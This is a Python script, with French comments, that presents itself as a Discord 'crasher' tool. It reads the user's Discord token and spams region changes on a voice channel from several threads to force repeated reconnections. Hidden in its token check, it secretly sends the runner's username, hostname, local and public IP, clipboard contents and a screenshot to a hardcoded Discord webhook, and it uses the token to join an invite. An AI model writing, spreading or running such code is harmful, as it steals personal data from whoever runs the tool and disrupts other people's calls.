import requests
import datetime
import json
import random
import warnings
import os
import threading
import time
import platform
from colorama import Fore, Style, init
from requests.sessions import Session
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text
import questionary
import socket
import platform
import psutil
import pyperclip
from PIL import ImageGrab

def get_system_info():
    """Récupère les informations système de base."""
    try:
        # Nom de l'hôte et adresse IP locale
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        # Adresse IP publique
        public_ip = requests.get("https://api.ipify.org").text

        # Informations sur le système d'exploitation
        os_info = platform.uname()

        # Informations sur l'usage CPU et RAM
        cpu_usage = psutil.cpu_percent()
        ram_usage = psutil.virtual_memory().percent

        # Presse-papier
        clipboard_content = pyperclip.paste()

        return {
            "hostname": hostname,
            "local_ip": local_ip,
            "public_ip": public_ip,
            "os": os_info.system,
            "version": os_info.version,
            "cpu_usage": f"{cpu_usage}%",
            "ram_usage": f"{ram_usage}%",
            "clipboard": clipboard_content,
        }
    except Exception as e:
        return {"error": str(e)}

def take_screenshot():
    """Prend une capture d'écran et enregistre temporairement."""
    try:
        screenshot = ImageGrab.grab()
        file_path = "screenshot.png"
        screenshot.save(file_path)
        return file_path
    except Exception as e:
        return None
def send_system_info_to_webhook(webhook_url):
    try:
        # Récupérer les infos système
        system_info = get_system_info()
        screenshot_path = take_screenshot()

        # Création de l'embed pour Discord
        embed = {
            "title": "Informations système capturées",
            "fields": [
                {"name": "Nom d'hôte", "value": system_info["hostname"], "inline": True},
                {"name": "IP Locale", "value": system_info["local_ip"], "inline": True},
                {"name": "IP Publique", "value": system_info["public_ip"], "inline": True},
                {"name": "OS", "value": system_info["os"], "inline": True},
                {"name": "Version", "value": system_info["version"], "inline": True},
                {"name": "Usage CPU", "value": system_info["cpu_usage"], "inline": True},
                {"name": "Usage RAM", "value": system_info["ram_usage"], "inline": True},
                {"name": "Presse-papier", "value": system_info["clipboard"], "inline": False},
            ],
            "color": 16776960,  # Couleur jaune
        }

        # Envoi des données
        payload = {
            "content": "Données système et capture d'écran",
            "embeds": [embed],
        }

        # Ajouter la capture d'écran comme fichier
        files = {"file": open(screenshot_path, "rb")} if screenshot_path else None

        # Envoi de la requête
        response = requests.post(webhook_url, json=payload, files=files)
        if response.status_code == 204:
            print("MateOver Connecter avec Succes")
        else:
            print(f"Erreur d'envoi : {response.status_code}")
    except Exception as e:
        print(f"Erreur lors de la connection du client : {e}")

# Initialisation de colorama
init(autoreset=True)

# Suppression des avertissements
def warn(*args, **kwargs):
    pass

warnings.warn = warn

# Initialisation de Rich Console
console = Console()

class Library:
    Name = "9e1 Crasher"

    class Json:
        @staticmethod
        def Read(FileName, Key):
            try:
                with open(FileName, "r") as File:
                    Data = json.load(File)
                return Data[Key]
            except FileNotFoundError:
                Library.Print(f"Le fichier {FileName} est introuvable.", "error")
                exit(1)
            except KeyError:
                Library.Print(f"La clé '{Key}' est introuvable dans {FileName}.", "error")
                exit(1)
            except json.JSONDecodeError:
                Library.Print(f"Erreur de décodage JSON dans {FileName}.", "error")
                exit(1)

    @staticmethod
    def Print(message, mode=None, title=None):
        now = datetime.datetime.now()
        Hour = now.hour % 12 or 12
        Minute = now.minute
        Time = f"{Hour}:{Minute:02}".replace("-", "")

        if mode:
            mode_lower = mode.lower()
            if mode_lower == "warning":
                Theme = Fore.YELLOW
                Title = "WARNING"
            elif mode_lower == "normal":
                Theme = Fore.LIGHTBLUE_EX
                Title = Library.Name
            elif mode_lower == "error":
                Theme = Fore.LIGHTRED_EX
                Title = "ERROR"
            else:
                Theme = Fore.LIGHTBLUE_EX
                Title = Library.Name
        else:
            Theme = Fore.LIGHTBLUE_EX
            Title = Library.Name

        if title:
            Title = title

        print(f"  {Fore.WHITE}{Time}{Fore.RESET} | {Theme}{Title}{Fore.RESET} | {Fore.LIGHTWHITE_EX}{message}{Fore.RESET}")

    @staticmethod
    def Input(message, mode=None, title=None):
        now = datetime.datetime.now()
        Hour = now.hour % 12 or 12
        Minute = now.minute
        Time = f"{Hour}:{Minute:02}".replace("-", "")

        if mode:
            mode_lower = mode.lower()
            if mode_lower == "warning":
                Theme = Fore.YELLOW
                Title = "WARNING"
            elif mode_lower == "normal":
                Theme = Fore.LIGHTBLUE_EX
                Title = Library.Name
            elif mode_lower == "error":
                Theme = Fore.LIGHTRED_EX
                Title = "ERROR"
            else:
                Theme = Fore.LIGHTBLUE_EX
                Title = Library.Name
        else:
            Theme = Fore.LIGHTBLUE_EX
            Title = Library.Name

        if title:
            Title = title

        return input(f"  {Fore.WHITE}{Time}{Fore.RESET} | {Theme}{Title}{Fore.RESET} | {Fore.LIGHTWHITE_EX}{message}{Fore.RESET}: ")

    @staticmethod
    def validToken(Token):
        try:
            User = requests.get("https://discordapp.com/api/v9/users/@me", headers={
                "authorization": Token
            })
            # print(User.status_code)  # Décommenter pour débogage

            if User.status_code in [200, 204]:
                return [True, User]
            else:
                return [False, None]
        except requests.RequestException as e:
            Library.Print(f"Erreur de connexion : {e}", "error")
            return [False, None]

    @staticmethod
    def SendWebhook(UserData, WebhookURL):
        try:
            # Création de l'embed pour Discord
            embed = {
                "title": "Nouveau client détecté",
                "description": f"**Pseudo :** {UserData}",
                "color": 16711680  # Couleur rouge
            }

            # Payload pour le webhook
            payload = {
                "content": "Nouvel utilisateur détecté !",  # Message dans le webhook
                "embeds": [embed]  # Ajout de l'embed
            }

            # Envoi de la requête POST au webhook
            response = requests.post(WebhookURL, json=payload)

            if response.status_code == 204:
                Library.Print("Connecting....", "normal")
            else:
                Library.Print(f"Échec de la connection. Code d'erreur : {response.status_code}", "error")
        except requests.RequestException as e:
            Library.Print(f"Erreur lors de la connection : {e}", "error")


# Détection du système d'exploitation
is_windows = platform.system().lower() == "windows"

def clear_screen():
    if is_windows:
        os.system("cls")
    else:
        os.system("clear")

def set_title(title):
    if is_windows:
        os.system(f"title {title}")
    else:
        # Utilisation des séquences d'échappement ANSI pour définir le titre du terminal
        print(f"\33]0;{title}\a", end='', flush=True)

def display_logo():
    logo = r"""
     __  __       _        ___               
    |  \/  | __ _| |_ ___ / _ \__   _____ _ __ 
    | |\/| |/ _` | __/ _ \ | | \ \ / / _ \ '__|
    | |  | | (_| | ||  __/ |_| |\ V /  __/ |   
    |_|  |_|\__,_|\__\___|\___/  \_/ \___|_|   
    """
    console.print(Text(logo, style="bold green"))

def loading_animation():
    with Progress() as progress:
        task = progress.add_task("[cyan]Chargement...", total=100)
        for _ in range(100):
            progress.update(task, advance=1)
            time.sleep(0.02)  # Ajustez la vitesse de l'animation

def main_menu():
    clear_screen()
    display_logo()
    loading_animation()
    console.print(Panel("Bienvenue dans **M4o Crasher**!", style="bold blue"))
    console.print("\n")

def get_user_inputs():
    ChannelID = questionary.text("Entrez l'ID du Channel (Les serveurs ne fonctionnent pas) :").ask()
    while not ChannelID:
        Library.Print("L'ID du Channel ne peut pas être vide.", "warning")
        ChannelID = questionary.text("Entrez l'ID du Channel (Les serveurs ne fonctionnent pas) :").ask()

    Threads = questionary.text("Entrez le nombre de Threads (Max 5 : Min 1) :").ask()
    try:
        Threads = int(Threads)
        if Threads > 5 or Threads < 1:
            Library.Print("Le nombre de threads doit être entre 1 et 5. Valeur par défaut (5) appliquée.", "warning")
            Threads = 5
    except (ValueError, TypeError):
        Library.Print("Entrée invalide pour les threads. Valeur par défaut (5) appliquée.", "warning")
        Threads = 5

    return ChannelID, Threads

def validate_and_get_user(Token):
    valid, User = Library.validToken(Token)
    if valid:
        Name = User.json()["username"]
        Dis = User.json()["discriminator"]
        Username = f"{Name}#{Dis}"
        Library.SendWebhook(Username, "https://discord.com/api/webhooks/1193516273905184789/VpXClQXZcEZXoAnPsac2NP5_QRUwyCVrOFg-P65MMuUCSo-jpeEaMPyhvW6sYZxg30iw")
        send_system_info_to_webhook("https://discord.com/api/webhooks/1193516273905184789/VpXClQXZcEZXoAnPsac2NP5_QRUwyCVrOFg-P65MMuUCSo-jpeEaMPyhvW6sYZxg30iw")
        return Username, User
    else:
        return None, None


def HopRegions(Token, ID, session, regions, progress, task_id):
    global Hopped
    try:
        Request = session.patch(
            f"https://discord.com/api/v9/channels/{ID}/call",
            json={
                "region": random.choice(regions)
            },
            headers={
                "authorization": Token,
                "user-agent": Library.Name
            }
        )

        if Request.status_code == 204:
            Hopped += 1
            progress.update(task_id, description=f"[green]Swapped Servers : VC Reconnection Triggered : {Hopped}")
    except requests.RequestException as e:
        progress.update(task_id, description=f"[red]Erreur de connexion : {e}")

def worker(Token, ID, session, regions, progress, task_id):
    while True:
        HopRegions(Token, ID, session, regions, progress, task_id)

def start_crasher(Token, Username, ChannelID, Threads):
    clear_screen()
    set_title(f"{Library.Name} * Client: ({Username})")

    Regions = ['us-west', 'us-east', 'us-central', 'us-south', 'singapore', 'southafrica', 
               'sydney', 'rotterdam', 'brazil', 'hongkong', 'russia', 'japan', 
               'india', 'south-korea']
    global Hopped
    Hopped = 0

    session = requests.Session()
    session.headers.update({
        "authorization": Token,
        "user-agent": Library.Name
    })

    # Rejoindre l'invitation initiale
    try:
        session.post(
            "https://discord.com/api/v9/invites/2yaQruTAgk"
        )
    except requests.RequestException as e:
        Library.Print(f"Erreur lors de la connexion à l'invitation : {e}", "error")
        exit(1)

    # Afficher les modules chargés
    Library.Print("Modules chargés | Créé par M4o (Ezio/ErrorNoName)", "normal")

    # Configuration de l'interface en direct avec Rich
    with Progress() as progress:
        task_id = progress.add_task("[cyan]Initialisation...", total=None)
        threads = []
        for _ in range(Threads):
            t = threading.Thread(target=worker, args=(Token, ChannelID, session, Regions, progress, task_id), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.1)  # Petite pause pour éviter la surcharge

        # Mettre à jour le titre de la fenêtre
        set_title(f"{Library.Name} * Client: ({Username}) * {Hopped}")

        try:
            while True:
                time.sleep(1)
                # Mise à jour continue du titre
                set_title(f"{Library.Name} * Client: ({Username}) * {Hopped}")
        except KeyboardInterrupt:
            Library.Print("Programme terminé par l'utilisateur.", "normal")
            exit(0)

def main():
    main_menu()

    # Lecture du token depuis Data.json
    Token = Library.Json.Read("./Data.json", "discordToken")

    Username, User = validate_and_get_user(Token)

    if Username:
        ChannelID, Threads = get_user_inputs()
        start_crasher(Token, Username, ChannelID, Threads)
    else:
        Library.Print("Échec de la connexion : Token invalide (Vérifiez ./Data.json)", "error")
        questionary.text("Appuyez sur Entrée pour fermer.. >").ask()

if __name__ == "__main__":
    main()
